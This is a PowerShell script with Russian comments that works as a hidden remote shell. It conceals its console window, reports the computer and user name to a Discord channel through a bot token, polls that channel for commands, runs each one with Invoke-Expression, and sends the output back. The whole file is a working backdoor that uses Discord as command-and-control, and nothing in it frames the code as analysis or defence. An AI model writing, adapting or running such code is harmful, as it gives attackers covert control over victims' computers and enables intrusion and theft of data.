$token = "$tk"      # ← из bat-файла
$chan  = "$ch"      # ← из bat-файла

# Скрываем окно
$t='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
Add-Type -Member $t -Name Win32 -Namespace Native -PassThru | Out-Null
$p=(Get-Process -Id $PID)
if($p.MainWindowHandle -ne 0){[Native.Win32]::ShowWindowAsync($p.MainWindowHandle,0)|Out-Null}

# === ОТПРАВКА СООБЩЕНИЯ (единственная причина всех 400 была здесь) ===
function Send {
    param([string]$msg = " ")
    # Главный фикс: экранируем обратные кавычки + убираем нулевые байты
    $msg = $msg -replace "`0","" -replace "`","ˋ"
    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $boundary = [guid]::NewGuid()
    $LF = "`r`n"
    $body = "--$boundary$LFContent-Disposition: form-data; name=`"payload_json`"$LF$LF$(@{content=$msg}|ConvertTo-Json -Compress)$LF--$boundary--"
    $headers = @{
        "Authorization" = "Bot $token"
        "Content-Type"  = "multipart/form-data; boundary=$boundary"
    }
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body ([text.encoding]::UTF8.GetBytes($body)) -TimeoutSec 10 | Out-Null
    } catch { }   # если совсем не получается — просто молчим, не падаем
}

# === ПОЛУЧЕНИЕ ПОСЛЕДНЕЙ КОМАНДЫ ===
function GetCmd {
    try {
        $r = Invoke-RestMethod -Uri "https://discord.com/api/v9/channels/$chan/messages?limit=1" -Headers @{"Authorization"="Bot $token"} -TimeoutSec 10
        if ($r -and -not $r[0].author.bot) { return $r[0].content.Trim() }
    } catch { }
    return $null
}

# === СТАРТ ===
$auth = $false
$last = ""

# Первое приветственное сообщение — теперь точно придёт
Send ":hourglass_flowing_sand: **$env:COMPUTERNAME** | `$env:USERNAME` | Session Waiting..."

while ($true) {
    Start-Sleep -Seconds 4
    $cmd = GetCmd
    if (-not $cmd -or $cmd -eq $last) { continue }
    $last = $cmd
    $dir = (Get-Location).Path

    # Авторизация по имени ПК
    if (-not $auth) {
        if ($cmd -eq $env:COMPUTERNAME) {
            $auth = $true
            Send ":white_check_mark: **$env:COMPUTERNAME** | Session Started! :white_check_mark:"
            Send "``PS $dir>``"
        }
        continue
    }

    # Управление
    if ($cmd -match '^(close|exit)$') { Send ":octagonal_sign: Session Closed."; break }
    if ($cmd -eq 'pause') { $auth=$false; Send ":pause_button: Session Paused."; continue }

    # Выполнение команды
    try {
        $out = Invoke-Expression $cmd 2>&1 | Out-String
    } catch { $out = "Ошибка: $($_.Exception.Message)" }
    if (!$out) { $out = "(нет вывода)" }

    # Разбиваем на куски по 1900 символов
    for ($i=0; $i -lt $out.Length; $i += 1900) {
        $chunk = $out.Substring($i, [Math]::Min(1900, $out.Length-$i))
        Send "``````$chunk``````"
        Start-Sleep -Milliseconds 450
    }
    Send "``PS $dir>``"
}
